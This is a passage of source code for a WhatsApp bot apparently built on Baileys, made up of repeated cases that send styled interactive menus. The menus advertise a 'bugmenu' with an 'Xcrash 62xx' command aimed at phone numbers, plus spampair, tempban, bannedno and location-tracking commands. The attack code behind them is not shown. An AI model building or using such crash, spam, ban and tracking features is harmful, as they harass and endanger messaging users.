hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/Xynz.jpg")}, { upload: zyn.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"𝐓𝐡𝐞 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 𝐙𝐡𝐢𝐫𝐨🐉\",\"url\":\"https://whatsapp.com/channel/0029VarTDNiFcowFnrgUeU2v\",\"merchant_url\":\"https://whatsapp.com/channel/0029VarTDNiFcowFnrgUeU2v\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await zyn.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

case 'bugmenu': {
await loading()
const version = require("baileys/package.json").version
const bugmenu = `
╭──(         *ᴊᴀʟʟᴛᴀᴍᴠᴀɴ*         )
║ᨒ 𝐌𝐚𝐫𝐠𝐚 𝐌𝐨𝐝𝐬\`\🩸
│🍃 𝐍𝐚𝐦𝐞 : ${pushname}
║▬▭▬▭▬▭▬▭▬▭
│🍃 𝐎𝐰𝐧𝐞𝐫 : ${namacreator}
║🍃 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝙅𝙖𝙡𝙡𝙈𝙤𝙙𝙨 𝘿𝙚𝙫\`\𐁘
│▬▭「 𝐉𝐚𝐥𝐥𝐂𝐫𝐚𝐬𝐡🩸 」▭▬
║
│ </> 𝙎𝙪𝙘𝙘𝙚𝙨 𝘼𝙘𝙘𝙚𝙨⚛
║ 
│›› *𝐄𝐱𝐚𝐦𝐩𝐥𝐞 : Xcrash 62xx*
║›› \`𝐗𝐗𝐕𝐈𝐏\`
│
║› 𝐉𝐀𝐋𝐋𝐝𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭©Copyright
╰━━━━━━━━━━━━━━━━━━━⬣`
let sections = [{
title: '𝐓𝐡𝐞 𝐉𝐚𝐥𝐥 𝐌𝐨𝐝𝐬𝟗𝟗𝟗〽️',
highlight_label: '𝐀𝐥𝐥 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝐀𝐋𝐋 𝐌𝐄𝐍𝐔🐉', 
id: '.allmenu'
}]
},
{
highlight_label: '𝐗𝐗𝐕𝐈𝐏',
rows: [{
title: '𝐈𝐍𝐅𝐈͢𝐍𝐈𝐓𝐘 ☇ 𝐙𝐀𝚸🐉', 
id: '.bugmenu'
}]
},
{
highlight_label: 'SPESIAL FITUR',
rows: [{
title: 'SPECIAL ☇ FITUR🐉', 
id: '.spesialfitur'
}]
},
{
highlight_label: '𝐒𝐭𝐨𝐫𝐞 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝑺𝒕𝒐𝒓𝒆🐉', 
id: '.storemenu'
}]
},
{
highlight_label: '𝐏𝐚𝐧𝐞𝐥 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝑷𝒂𝒏𝒆𝒍🐉', 
id: '.panelmenu'
}]
},
{
highlight_label: '𝐓𝐨𝐨𝐥𝐬 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝑻𝒐𝒐𝒍𝒔🐉', 
id: '.toolsmenu'
}]
},
{
highlight_label: '𝐆𝐫𝐨𝐮𝐩 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝑮𝒓𝒐𝒖𝒑🐉', 
id: '.groupmenu'
}]
},
{
highlight_label: '𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝐎𝐖𝐍𝐄𝐑🐉', 
id: '.ownermenu'
}]
}]
let listMessage = {
    title: '𝐉𝐚𝐥𝐥𝐓𝐚𝐦𝐯𝐚𝐧🩸', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: bugmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/Xynz.jpg")}, { upload: zyn.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"𝐓𝐡𝐞 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 𝐙𝐡𝐢𝐫𝐨🐉\",\"url\":\"https://whatsapp.com/channel/0029VarTDNiFcowFnrgUeU2v\",\"merchant_url\":\"https://whatsapp.com/channel/0029VarTDNiFcowFnrgUeU2v\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await zyn.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

case 'spesialfitur': {
await loading()
const version = require("baileys/package.json").version
const spesialfitur = `
╭──(         *𝐉𝐀𝐋𝐋*         )
║ᨒ 𝐌𝐚𝐫𝐠𝐚 MODS\`\❄
│🍃 𝐍𝐚𝐦𝐞 : ${pushname}
║▬▭▬▭▬▭▬▭▬▭
│🍃 𝐎𝐰𝐧𝐞𝐫 : ${namacreator}
║🍃 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝙅𝙖𝙡𝙡𝙈𝙤𝙙𝙨 𝘿𝙚𝙫\`\𐁘
│▬▭「 𝐉𝐚𝐥𝐥𝐓𝐚𝐦𝐯𝐚𝐧🩸 」▭▬
║
╔─═⊱ *「 \`SPESIAL MENU\` 」* ─═⬣
│┏⊱
║⿻ howtousedbug
║⿻ lacaklokasi <nama>
║⿻ bannedno
║⿻ infono
║⿻ ttqqtoo
║⿻ infobot
║⿻ tempban
║⿻ spampair
║⿻ antibugon
║⿻ antibugoff
║⿻ clearchat
║⿻ katakatajack
┗━━━━━━━━━━━━━━━━━⬣`
let sections = [{
title: '𝐓𝐡𝐞 𝐉𝐚𝐥𝐥 𝐌𝐨𝐝𝐬𝟗𝟗𝟗〽️',
highlight_label: '𝐀𝐥𝐥 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝐀𝐋𝐋 𝐌𝐄𝐍𝐔🐉', 
id: '.allmenu'
}]
},
{
highlight_label: '𝐗𝐗𝐕𝐈𝐏',
rows: [{
title: '𝐈𝐍𝐅𝐈͢𝐍𝐈𝐓𝐘 ☇ 𝐙𝐀𝚸🐉', 
id: '.bugmenu'
}]
},
{
highlight_label: 'SPESIAL FITUR',
rows: [{
title: 'SPECIAL ☇ FITUR🐉', 
id: '.spesialfitur'
}]
},
{
highlight_label: '𝐒𝐭𝐨𝐫𝐞 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝑺𝒕𝒐𝒓𝒆🐉', 
id: '.storemenu'
}]
},
{
highlight_label: '𝐏𝐚𝐧𝐞𝐥 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝑷𝒂𝒏𝒆𝒍🐉', 
id: '.panelmenu'
}]
},
{
highlight_label: '𝐓𝐨𝐨𝐥𝐬 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝑻𝒐𝒐𝒍𝒔🐉', 
id: '.toolsmenu'
}]
},
{
highlight_label: '𝐆𝐫𝐨𝐮𝐩 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝑮𝒓𝒐𝒖𝒑🐉', 
id: '.groupmenu'
}]
},
{
highlight_label: '𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝐎𝐖𝐍𝐄𝐑🐉', 
id: '.ownermenu'
}]
}]
let listMessage = {
    title: '𝐉𝐚𝐥𝐥𝐓𝐚𝐦𝐯𝐚𝐧🩸', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: spesialfitur
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/Xynz.jpg")}, { upload: zyn.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"𝐓𝐡𝐞 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 𝐙𝐡𝐢𝐫𝐨🐉\",\"url\":\"https://whatsapp.com/channel/0029VarTDNiFcowFnrgUeU2v\",\"merchant_url\":\"https://whatsapp.com/channel/0029VarTDNiFcowFnrgUeU2v\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await zyn.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

case 'storemenu': {
await loading()
const version = require("baileys/package.json").version
const storemenu = `
╭──(         *𝐉𝐚𝐥𝐥𝐌𝐨𝐝𝐬✔️*         )
║ᨒ 𝐌𝐚𝐫𝐠𝐚 𝐉𝐚𝐥𝐥\`🩸
│🫧 𝐍𝐚𝐦𝐞 : ${pushname}
║▬▭▬▭▬▭▬▭▬▭
│🫧 𝐎𝐰𝐧𝐞𝐫 : ${namacreator}
║🫧 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝙅𝙖𝙡𝙡𝙈𝙤𝙙𝙨 𝘿𝙚𝙫\`\𐁘
│🫧 𝐎𝐰𝐧 𝐍𝐨 : 6283193344628
║🫧 𝐏𝐫𝐞𝐟𝐢𝐱 : 𝐌𝐔𝐋𝐓𝐈
│▬▭「 𝐉𝐚𝐥𝐥𝐓𝐚𝐦𝐯𝐚𝐧🩸 」▭▬
║› 𝚃𝚑𝚎𝙹𝚊𝚕𝚕𝙼𝚘𝚍𝚜𝟿𝟿𝟿 ©Copyright
╰━━━━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`STORE MENU\` 」* ─═⬣
│┏⊱
║⿻ Payment
│⿻ Danamasuk
║⿻ Proses
│⿻ Done
║⿻ Jpmpromosi
│⿻ Jpm3
║⿻ 7GB
│⿻ 8GB
║⿻ 9GB
│⿻ Unli
║⿻ Listsrv
│⿻ Delsrv
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣`
let sections = [{
title: '𝐓𝐡𝐞 𝐉𝐚𝐥𝐥 𝐌𝐨𝐝𝐬𝟗𝟗𝟗〽️',
highlight_label: '𝐀𝐥𝐥 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝐀𝐋𝐋 𝐌𝐄𝐍𝐔🐉', 
id: '.allmenu'
}]
},
{
highlight_label: '𝐗𝐗𝐕𝐈𝐏',
rows: [{
title: '𝐈𝐍𝐅𝐈͢𝐍𝐈𝐓𝐘 ☇ 𝐙𝐀𝚸🐉', 
id: '.bugmenu'
}]
},
{
highlight_label: 'SPESIAL FITUR',
rows: [{
title: 'SPECIAL ☇ FITUR🐉', 
id: '.spesialfitur'
}]
},
{
highlight_label: '𝐒𝐭𝐨𝐫𝐞 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝑺𝒕𝒐𝒓𝒆🐉', 
id: '.storemenu'
}]
},
{
highlight_label: '𝐏𝐚𝐧𝐞𝐥 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝑷𝒂𝒏𝒆𝒍🐉', 
id: '.panelmenu'
}]
},
{
highlight_label: '𝐓𝐨𝐨𝐥𝐬 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝑻𝒐𝒐𝒍𝒔🐉', 
id: '.toolsmenu'
}]
},
{
highlight_label: '𝐆𝐫𝐨𝐮𝐩 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝑮𝒓𝒐𝒖𝒑🐉', 
id: '.groupmenu'
}]
},
{
highlight_label: '𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝐎𝐖𝐍𝐄𝐑🐉', 
id: '.ownermenu'
}]
}]
let listMessage = {
    title: '𝐉𝐚𝐥𝐥𝐓𝐚𝐦𝐯𝐚𝐧🩸', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: storemenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/Xynz.jpg")}, { upload: zyn.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"𝐓𝐡𝐞 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 𝐙𝐡𝐢𝐫𝐨🐉\",\"url\":\"https://whatsapp.com/channel/0029VarTDNiFcowFnrgUeU2v\",\"merchant_url\":\"https://whatsapp.com/channel/0029VarTDNiFcowFnrgUeU2v\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await zyn.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

case 'allmenu': {
await loading()
const version = require("baileys/package.json").version
const allmenu = `
╭──(         *𝐉𝐚𝐥𝐥𝐌𝐨𝐝𝐬✔️*         )
║ᨒ 𝐌𝐚𝐫𝐠𝐚 𝐉𝐚𝐥𝐥\`🩸
│🫧 𝐍𝐚𝐦𝐞 : ${pushname}
║▬▭▬▭▬▭▬▭▬▭
│🫧 𝐎𝐰𝐧𝐞𝐫 : ${namacreator}
║🫧 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝙅𝙖𝙡𝙡𝙈𝙤𝙙𝙨 𝘿𝙚𝙫\`\𐁘
│🫧 𝐎𝐰𝐧 𝐍𝐨 : 6283193344628
║🫧 𝐏𝐫𝐞𝐟𝐢𝐱 : 𝐌𝐔𝐋𝐓𝐈
│▬▭「 𝐉𝐚𝐥𝐥𝐓𝐚𝐦𝐯𝐚𝐧🩸 」▭▬
║› 𝚃𝚑𝚎𝙹𝚊𝚕𝚕𝙼𝚘𝚍𝚜𝟿𝟿𝟿 ©Copyright
╰━━━━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`OWNER CMD\` 」* ─═⬣
│┏⊱
│⿻ Setowner
║⿻ Addowmer
│⿻ Delowner
║⿻ Addprem
│⿻ Delprem
║⿻ Public
│⿻ Self
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`TOOLSS MENU\` 」* ─═⬣
│┏⊱
║⿻ Enc
│⿻ Encrypt
║⿻ Ai
║┗⊱
┗━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`GROUPS MENU\` 」* ─═⬣
│┏⊱
║⿻ Promote
│⿻ Kick
║⿻ Tagall
│⿻ Hidetag
║⿻ Demote
║┗⊱
┗━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`STORE MENU\` 」* ─═⬣
│┏⊱
║⿻ Payment
│⿻ Danamasuk
║⿻ Proses
│⿻ Done
║⿻ Jpmpromosi
│⿻ Jpm3
║┗⊱
┗━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`PANEL MENU\` 」* ─═⬣
│⿻ 1GB
║⿻ 2GB
│⿻ 3GB
║⿻ 4GB
│⿻ 5GB
║⿻ 6GB
│⿻ 7GB
║⿻ 8GB
│⿻ 9GB
║⿻ Unli
│⿻ Listsrv
║⿻ Delsrv
║┗⊱
┗━━━━━━━━━━━━━━━━⬣

┏━━⬣  Version Secript  友
┃ [3.0]
┗━━⬣  ⿻  ⌜ JALLBANINDO🩸 ⌟  ⿻`
let sections = [{
title: '𝐓𝐡𝐞 𝐉𝐚𝐥𝐥 𝐌𝐨𝐝𝐬𝟗𝟗𝟗〽️',
highlight_label: '𝐀𝐥𝐥 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝐀𝐋𝐋 𝐌𝐄𝐍𝐔🐉', 
id: '.allmenu'
}]
},
{
highlight_label: '𝐗𝐗𝐕𝐈𝐏',
rows: [{
title: '𝐈𝐍𝐅𝐈͢𝐍𝐈𝐓𝐘 ☇ 𝐙𝐀𝚸🐉', 
id: '.bugmenu'
}]
},
{
highlight_label: 'SPESIAL FITUR',
rows: [{
title: 'SPECIAL ☇ FITUR🐉', 
id: '.spesialfitur'
}]
},
{
highlight_label: '𝐒𝐭𝐨𝐫𝐞 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝑺𝒕𝒐𝒓𝒆🐉', 
id: '.storemenu'
}]
},
{
highlight_label: '𝐏𝐚𝐧𝐞𝐥 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝑷𝒂𝒏𝒆𝒍🐉', 
id: '.panelmenu'
}]
},
{
highlight_label: '𝐓𝐨𝐨𝐥𝐬 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝑻𝒐𝒐𝒍𝒔🐉', 
id: '.toolsmenu'
}]
},
{
highlight_label: '𝐆𝐫𝐨𝐮𝐩 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝑮𝒓𝒐𝒖𝒑🐉', 
id: '.groupmenu'
}]
},
{
highlight_label: '𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝐎𝐖𝐍𝐄𝐑🐉', 
id: '.ownermenu'
}]
}]
let listMessage = {
    title: '𝐉𝐚𝐥𝐥𝐓𝐚𝐦𝐯𝐚𝐧🩸', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: allmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/Xynz.jpg")}, { upload: zyn.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"𝐓𝐡𝐞 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 𝐙𝐡𝐢𝐫𝐨🐉\",\"url\":\"https://whatsapp.com/channel/0029VarTDNiFcowFnrgUeU2v\",\"merchant_url\":\"https://whatsapp.com/channel/0029VarTDNiFcowFnrgUeU2v\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await zyn.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

case 'toolsmenu': {
await loading()
const version = require("baileys/package.json").version
const toolsmenu = `
╭──(         *𝐉𝐚𝐥𝐥𝐌𝐨𝐝𝐬✔️*         )
║ᨒ 𝐌𝐚𝐫𝐠𝐚 𝐉𝐚𝐥𝐥\`🩸
│🫧 𝐍𝐚𝐦𝐞 : ${pushname}
║▬▭▬▭▬▭▬▭▬▭
│🫧 𝐎𝐰𝐧𝐞𝐫 : ${namacreator}
║🫧 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝙅𝙖𝙡𝙡𝙈𝙤𝙙𝙨 𝘿𝙚𝙫\`\𐁘
│🫧 𝐎𝐰𝐧 𝐍𝐨 : 6283193344628
║🫧 𝐏𝐫𝐞𝐟𝐢𝐱 : 𝐌𝐔𝐋𝐓𝐈
│▬▭「 𝐉𝐚𝐥𝐥𝐓𝐚𝐦𝐯𝐚𝐧🩸 」▭▬
║› 𝚃𝚑𝚎𝙹𝚊𝚕𝚕𝙼𝚘𝚍𝚜𝟿𝟿𝟿 ©Copyright
╰━━━━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`TOOLS MENU\` 」* ─═⬣
│┏⊱
║⿻ Enc
│⿻ Encrypt
║⿻ Ai
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣`
let sections = [{
title: '𝐓𝐡𝐞 𝐉𝐚𝐥𝐥 𝐌𝐨𝐝𝐬𝟗𝟗𝟗〽️',
highlight_label: '𝐀𝐥𝐥 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝐀𝐋𝐋 𝐌𝐄𝐍𝐔🐉', 
id: '.allmenu'
}]
},
{
highlight_label: '𝐗𝐗𝐕𝐈𝐏',
rows: [{
title: '𝐈𝐍𝐅𝐈͢𝐍𝐈𝐓𝐘 ☇ 𝐙𝐀𝚸🐉', 
id: '.bugmenu'
}]
},
{
highlight_label: 'SPESIAL FITUR',
rows: [{
title: 'SPECIAL ☇ FITUR🐉', 
id: '.spesialfitur'
}]
},
{
highlight_label: '𝐒𝐭𝐨𝐫𝐞 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝑺𝒕𝒐𝒓𝒆🐉', 
id: '.storemenu'
}]
},
{
highlight_label: '𝐏𝐚𝐧𝐞𝐥 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝑷𝒂𝒏𝒆𝒍🐉', 
id: '.panelmenu'
}]
},
{
highlight_label: '𝐓𝐨𝐨𝐥𝐬 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝑻𝒐𝒐𝒍𝒔🐉', 
id: '.toolsmenu'
}]
},
{
highlight_label: '𝐆𝐫𝐨𝐮𝐩 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝑮𝒓𝒐𝒖𝒑🐉', 
id: '.groupmenu'
}]
},
{
highlight_label: '𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝐎𝐖𝐍𝐄𝐑🐉', 
id: '.ownermenu'
}]
}]
let listMessage = {
    title: '𝐉𝐚𝐥𝐥𝐓𝐚𝐦𝐯𝐚𝐧🩸', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: toolsmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/Xynz.jpg")}, { upload: zyn.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"𝐓𝐡𝐞 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 𝐙𝐡𝐢𝐫𝐨🐉\",\"url\":\"https://whatsapp.com/channel/0029VarTDNiFcowFnrgUeU2v\",\"merchant_url\":\"https://whatsapp.com/channel/0029VarTDNiFcowFnrgUeU2v\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await zyn.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

case 'groupmenu': {
await loading()
const version = require("baileys/package.json").version
const groupmenu = `
╭──(         *𝐉𝐚𝐥𝐥𝐌𝐨𝐝𝐬✔️*         )
║ᨒ 𝐌𝐚𝐫𝐠𝐚 𝐉𝐚𝐥𝐥\`🩸
│🫧 𝐍𝐚𝐦𝐞 : ${pushname}
║▬▭▬▭▬▭▬▭▬▭
│🫧 𝐎𝐰𝐧𝐞𝐫 : ${namacreator}
║🫧 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝙅𝙖𝙡𝙡𝙈𝙤𝙙𝙨 𝘿𝙚𝙫\`\𐁘
│🫧 𝐎𝐰𝐧 𝐍𝐨 : 6283193344628
║🫧 𝐏𝐫𝐞𝐟𝐢𝐱 : 𝐌𝐔𝐋𝐓𝐈
│▬▭「 𝐉𝐚𝐥𝐥𝐓𝐚𝐦𝐯𝐚𝐧🩸 」▭▬
║› 𝚃𝚑𝚎𝙹𝚊𝚕𝚕𝙼𝚘𝚍𝚜𝟿𝟿𝟿 ©Copyright
╰━━━━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`GROUP MENU\` 」* ─═⬣
│┏⊱
║⿻ Hidetag
│⿻ Tagall
║⿻ Kick
│⿻ Promote
║⿻ Demote
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣`
let sections = [{
title: '𝐓𝐡𝐞 𝐑𝐚𝐟𝐳 𝐌𝐨𝐝𝐬𝟗𝟗𝟗〽️',
highlight_label: '𝐀𝐥𝐥 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝐀𝐋𝐋 𝐌𝐄𝐍𝐔🐉', 
id: '.allmenu'
}]
},
{
highlight_label: '𝐗𝐗𝐕𝐈𝐏',
rows: [{
title: '𝐈𝐍𝐅𝐈͢𝐍𝐈𝐓𝐘 ☇ 𝐙𝐀𝚸🐉', 
id: '.bugmenu'
}]
},
{
highlight_label: 'SPESIAL FITUR',
rows: [{
title: 'SPECIAL ☇ FITUR🐉', 
id: '.spesialfitur'
}]
},
{
highlight_label: '𝐒𝐭𝐨𝐫𝐞 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝑺𝒕𝒐𝒓𝒆🐉', 
id: '.storemenu'
}]
},
{
highlight_label: '𝐏𝐚𝐧𝐞𝐥 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝑷𝒂𝒏𝒆𝒍🐉', 
id: '.panelmenu'
}]
},
{
highlight_label: '𝐓𝐨𝐨𝐥𝐬 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝑻𝒐𝒐𝒍𝒔🐉', 
id: '.toolsmenu'
}]
},
{
highlight_label: '𝐆𝐫𝐨𝐮𝐩 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝑮𝒓𝒐𝒖𝒑🐉', 
id: '.groupmenu'
}]
},
{
highlight_label: '𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝐎𝐖𝐍𝐄𝐑🐉', 
id: '.ownermenu'
}]
}]
let listMessage = {
    title: '𝐉𝐚𝐥𝐥𝐓𝐚𝐦𝐯𝐚𝐧🩸', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: groupmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/Xynz.jpg")}, { upload: zyn.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"𝐓𝐡𝐞 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 𝐙𝐡𝐢𝐫𝐨🐉\",\"url\":\"https://whatsapp.com/channel/0029VarTDNiFcowFnrgUeU2v\",\"merchant_url\":\"https://whatsapp.com/channel/0029VarTDNiFcowFnrgUeU2v\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await zyn.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

case 'ownermenu': {
await loading()
const version = require("baileys/package.json").version
const ownermenu = `
╭──(         *𝐉𝐚𝐥𝐥𝐌𝐨𝐝𝐬✔️*         )
║ᨒ 𝐌𝐚𝐫𝐠𝐚 𝐉𝐚𝐥𝐥\`🩸
│🫧 𝐍𝐚𝐦𝐞 : ${pushname}
║▬▭▬▭▬▭▬▭▬▭
│🫧 𝐎𝐰𝐧𝐞𝐫 : ${namacreator}
║🫧 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝙅𝙖𝙡𝙡𝙈𝙤𝙙𝙨 𝘿𝙚𝙫\`\𐁘
│🫧 𝐎𝐰𝐧 𝐍𝐨 : 6283193344628
║🫧 𝐏𝐫𝐞𝐟𝐢𝐱 : 𝐌𝐔𝐋𝐓𝐈
